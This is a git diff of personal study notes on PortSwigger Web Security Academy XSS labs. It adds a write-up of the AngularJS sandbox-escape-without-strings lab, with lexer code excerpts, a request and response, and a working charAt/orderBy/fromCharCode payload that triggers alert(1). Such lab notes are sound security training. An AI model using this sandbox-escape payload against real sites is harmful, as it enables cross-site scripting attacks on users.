@@ -7,7 +7,9 @@ https://portswigger.net/web-security/cross-site-scripting/reflected
 <span style="color:yellow;font-weight:700;font-size:30px">
 Exploiting cross-site scripting vulnerabilities - 3 labs
 </span>
+
 https://portswigger.net/web-security/cross-site-scripting/exploiting
+
 
 # ***1. Lab: Exploiting cross-site scripting to steal cookies***
 https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies
@@ -553,29 +555,94 @@ payload:
 
 
 
-
-
-
-
-
-
-
-
-
-<!-- 
-# **AngularJS sandbox**
-https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox
-
+**Client-side template injection**
+https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection
 
 # ***1. Lab: Reflected XSS with AngularJS sandbox escape without strings***
+https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings
 
+
+This lab uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS.
+
+To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the alert function without using the $eval function. 
+
+
+**Materials**:
+1. fool IsIdent():
+```
+'a'.constructor.prototype.charAt=[].join
+```
+2. execution code:
+```
+$eval('x=alert(1)')
+```
+3. bypassing eval() blacklisted:
+```
+[123]|orderBy:'Some string'
+```
+* The colon signifies an argument to send to the filter, which in this case is a string. The orderBy filter is normally used to sort an object, but it also accepts an expression, which means we can use it to pass a payload. 
+
+
+1. observe a the Angular.js load at: 
+request:
+**GET /resources/js/angular_1-4-4.js HTTP/1.1** 
+
+find isident() function call (line 203-205)
+```js
+ec.prototype={
+    constructor:ec,lex:function(a){
+        this.text=a;
+        this.index=0;
+        for(this.tokens=[];
+        this.index<this.text.length;
+        )if(a=this.text.charAt(this.index),'"'===a||"'"===a)this.readString(a);
+    else if(this.isNumber(a)||"."===a&&this.isNumber(this.peek()))this.readNumber();
+    else if(this.isIdent(a))this.readIdent();
+    else if(this.is(a,"(){}[].,;:?"))this.tokens.push({
+        index:this.index,text:a
+        }
+    },
+    isIdent:function(a){
+        return"a"<=a&&"z">=a||"A"<=a&&"Z">=a||"_"===a||"$"===a
+    },
+    readIdent:function(){
+    for(var a=this.index;this.index<this.text.length;){var c=this.text.charAt(this.index);if(!this.isIdent(c)&&!this.isNumber(c))break;this.index++
+
+```
+2. in search page we find the call to angularJS to handle search parameters:
+request:
+```
+GET /?search=test HTTP/1.1
+```
+response:
+```html
 <script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
     $scope.query = {};
     var key = 'search';
     $scope.query[key] = 'test';
     $scope.value = $parse(key)($scope.query);
 });</script>
+```
+3. **final payload**:
+```
+1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+```
+portswiggers solution:
+```
+https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+```
 
-# TBC -->
+**Explanation:**
+
+The exploit uses toString() to create a string without using quotes. It then gets the String prototype and overwrites the charAt function for every string. This effectively breaks the AngularJS sandbox. Next, an array is passed to the orderBy filter. We then set the argument for the filter by again using toString() to create a string and the String constructor property. Finally, we use the fromCharCode method generate our payload by converting character codes into the string x=alert(1). Because the charAt function has been overwritten, AngularJS will allow this code where normally it would not.
+
+<!-- didnt work:
+'a'.constructor.prototype.charAt=[].join;[123]|orderBy:'x=alert(1)') -->
+
+# cool
+
+
+
+
 
 
